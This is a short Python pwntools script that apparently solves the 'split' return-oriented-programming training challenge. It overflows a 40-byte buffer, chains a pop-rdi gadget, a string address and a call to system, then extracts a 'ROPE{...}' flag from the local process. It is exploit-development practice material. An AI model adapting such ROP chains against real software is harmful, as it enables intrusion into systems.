#!/usr/bin/python
from pwn import *

context.bits=64

pop_rdi = 0x4007c3
call_ls = 0x40074b
call_string = 0x601060

payload = b"A"*40
payload += p64(pop_rdi)
payload += p64(call_string)
payload += p64(call_ls)

print(payload)

elf = ELF('split')

p = process(elf.path)
p.sendline(payload)

response = p.recvall()              #gets all messages in the process
print(re.search("(ROPE{.*?})",response.decode()))

#p.interactive()
